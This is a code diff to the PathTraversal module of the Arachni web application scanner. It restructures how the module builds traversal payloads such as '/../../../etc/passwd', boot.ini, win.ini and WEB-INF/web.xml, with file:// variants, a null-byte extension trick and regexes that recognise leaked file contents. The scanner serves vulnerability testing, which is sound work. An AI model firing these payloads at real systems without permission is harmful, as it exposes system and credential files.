@@ -19,7 +19,7 @@
 #
 # @author Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
 #
-# @version 0.2.6
+# @version 0.3
 #
 # @see http://cwe.mitre.org/data/definitions/22.html
 # @see http://www.owasp.org/index.php/Path_Traversal
@@ -27,60 +27,65 @@
 #
 class Arachni::Modules::PathTraversal < Arachni::Module::Base
 
-    def self.inputs
-        return @inputs if @inputs
+    def self.options
+        @options ||= {
+            format: [Format::STRAIGHT],
+            regexp: [
+                /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
+                /\[boot loader\](.*)\[operating systems\]/im,
+                /\[fonts\](.*)\[extensions\]/im,
+                /<web\-app/im
+            ],
 
-        @inputs = {}
-        {
-            'etc/passwd'      => /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
-            'boot.ini'        => /\[boot loader\](.*)\[operating systems\]/im,
-            'windows/win.ini' => /\[fonts\](.*)\[extensions\]/im,
-            'winnt/win.ini'   => /\[fonts\](.*)\[extensions\]/im
-        }.each do |file, regexp|
-            [
+            # Add one more mutation (on the fly) which will include the extension
+            # of the original value (if that value was a filename) after a null byte.
+            each_mutation: proc do |mutation|
+                m = mutation.dup
+
+                # Figure out the extension of the default value, if it has one.
+                ext = m.orig[m.altered].to_s.split( '.' )
+                ext = ext.size > 1 ? ext.last : nil
+
+                # Null-terminate the injected value and append the ext.
+                m.altered_value += "\x00.#{ext}"
+
+                # Pass our new element back to be audited.
+                m
+            end
+        }
+    end
+
+    def self.payloads
+        return @payloads if @payloads
+
+        @payloads = {
+            unix:    [ 'etc/passwd' ],
+            windows: [
+                'boot.ini',
+                'windows/win.ini',
+                'winnt/win.ini'
+            ]
+        }.inject({}) do |h, (platform, payloads)|
+            h[platform] = [
                 '/',
                 '/../../../../../../../../../../../../../../../../'
-            ].each do |trv|
-                @inputs["#{trv}#{file}"] = regexp
-                @inputs["file://#{trv}#{file}"] = regexp
-            end
+            ].map do |trv|
+                payloads.map do |payload|
+                    [ "#{trv}#{payload}", "file://#{trv}#{payload}" ]
+                end
+            end.flatten
+            h
         end
 
-        [
-            '',
-            '/',
-            '/../../',
-            '../../',
-        ].each do |trv|
-            @inputs["#{trv}WEB-INF/web.xml"] = '<web-app'
-            @inputs["file://#{trv}WEB-INF/web.xml"] = '<web-app'
-        end
+        @payloads[:tomcat] = [ '', '/', '/../../', '../../', ].map do |trv|
+             [ "#{trv}WEB-INF/web.xml", "file://#{trv}WEB-INF/web.xml" ]
+        end.flatten
 
-        @inputs
+        @payloads
     end
 
     def run
-        # add one more mutation (on the fly) which will include the extension
-        # of the original value after a null byte
-        each_mutation = proc do |mutation|
-            m = mutation.dup
-
-            # figure out the extension of the default value, if it has one
-            ext = m.orig[m.altered].to_s.split( '.' )
-            ext = ext.size > 1 ? ext.last : nil
-
-            # null terminate the injected value and append the ext
-            m.altered_value += "\x00.#{ext}"
-
-            # pass our new element back to be audited
-            m
-        end
-
-        self.class.inputs.each do |file, regexp|
-            audit( file, format:        [Format::STRAIGHT],
-                         regexp:        regexp,
-                         each_mutation: each_mutation )
-        end
+        audit self.class.payloads, self.class.options
     end
 
     def self.info
@@ -91,7 +96,7 @@ class Arachni::Modules::PathTraversal < Arachni::Module::Base
                 based on the presence of relevant content in the HTML responses.},
             elements:    [ Element::FORM, Element::LINK, Element::COOKIE, Element::HEADER ],
             author:      'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com> ',
-            version:     '0.2.6',
+            version:     '0.3',
             references:  {
                 'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                 'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
